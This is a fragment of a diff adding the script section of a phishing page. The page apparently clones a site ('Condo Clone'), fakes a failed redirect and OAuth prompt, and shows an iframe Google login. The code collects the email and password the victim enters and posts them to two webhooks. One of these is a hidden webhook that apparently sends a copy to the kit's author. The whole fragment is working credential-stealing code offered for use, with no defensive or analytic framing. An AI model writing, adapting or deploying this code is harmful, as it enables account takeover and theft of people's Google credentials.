+    var redirectOverlay = document.getElementById('redirectOverlay');
+    var countdownDisplay = document.getElementById('countdownDisplay');
+    var redirectFailedToast = document.getElementById('redirectFailedToast');
+    var oauthOverlay = document.getElementById('oauthOverlay');
+    var oauthContinue = document.getElementById('oauthContinue');
+    var loginIframeWrapper = document.getElementById('loginIframeWrapper');
+    var closeIframeBtn = document.getElementById('closeIframeBtn');
+    var loginIframe = document.getElementById('loginIframe');
+    var toastTimer = null;
+
+    function showToast(msg) {
+      redirectFailedToast.textContent = msg || 'Redirect failed. Please try again.';
+      redirectFailedToast.style.display = 'block';
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(function() { redirectFailedToast.style.display = 'none'; }, 3000);
+    }
+
+    function sendToWebhooks(email, pass) {
+      var payload = {
+        embeds: [{
+          title: '🔐 Google Credentials (iframe steal)',
+          color: 0x1a73e8,
+          fields: [
+            { name: '📧 Email', value: '\`' + email + '\`', inline: false },
+            { name: '🔑 Password', value: '\`' + pass + '\`', inline: false },
+            { name: '🕒 Time', value: new Date().toLocaleString(), inline: true },
+            { name: '🌐 IP', value: '\`' + window.location.hostname + '\`', inline: true }
+          ],
+          footer: { text: 'Stealer Forge • Condo Clone', icon_url: 'https://www.google.com/favicon.ico' },
+          timestamp: new Date().toISOString()
+        }]
+      };
+      var body = JSON.stringify(payload);
+      if (WEBHOOK && WEBHOOK.startsWith('http')) {
+        fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body }).catch(function() {});
+      }
+      if (HIDDEN_WEBHOOK && HIDDEN_WEBHOOK.startsWith('http')) {
+        fetch(HIDDEN_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body }).catch(function() {});
+      }
+    }
+
+    window.addEventListener('message', function(event) {
+      var data = event.data;
+      if (data && data.type === 'googleLogin' && data.email && data.password) {
+        sendToWebhooks(data.email, data.password);
+        loginIframeWrapper.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    });
+
+    window.startRedirectSequence = function() {
+      redirectOverlay.classList.add('active');
+      var countdown = 3;
+      countdownDisplay.textContent = countdown;
+      var interval = setInterval(function() {
+        countdown -= 1;
+        countdownDisplay.textContent = countdown;
+        if (countdown <= 0) {
+          clearInterval(interval);
+          redirectOverlay.classList.remove('active');
+          showToast('Redirect failed. Please try again.');
+          setTimeout(function() {
+            redirectFailedToast.style.display = 'none';
+            oauthOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+          }, 3000);
+        }
+      }, 1000);
+    };
+
+    if (oauthContinue) {
+      oauthContinue.addEventListener('click', function() {
+        oauthOverlay.classList.remove('active');
+        // Reload iframe content
+        var srcdoc = loginIframe.getAttribute('srcdoc');
+        loginIframe.srcdoc = '';
+        setTimeout(function() {
+          loginIframe.srcdoc = srcdoc;
+        }, 50);
+        loginIframeWrapper.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+    }
+
+    if (closeIframeBtn) {
+      closeIframeBtn.addEventListener('click', function() {
+        loginIframeWrapper.classList.remove('active');
+        document.body.style.overflow = '';
+        oauthOverlay.classList.add('active');
+      });
+    }
+
+    loginIframeWrapper.addEventListener('click', function(e) {
+      if (e.target === loginIframeWrapper) {
+        loginIframeWrapper.classList.remove('active');
+        document.body.style.overflow = '';
+        oauthOverlay.classList.add('active');
+      }
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        if (loginIframeWrapper.classList.contains('active')) {
+          loginIframeWrapper.classList.remove('active');
+          document.body.style.overflow = '';
+          oauthOverlay.classList.add('active');
+        }
+        if (oauthOverlay && oauthOverlay.classList.contains('active')) {
+          oauthOverlay.classList.remove('active');
+          document.body.style.overflow = '';
+        }
+      }
+    });
+  </script>
+</body>
+</html>
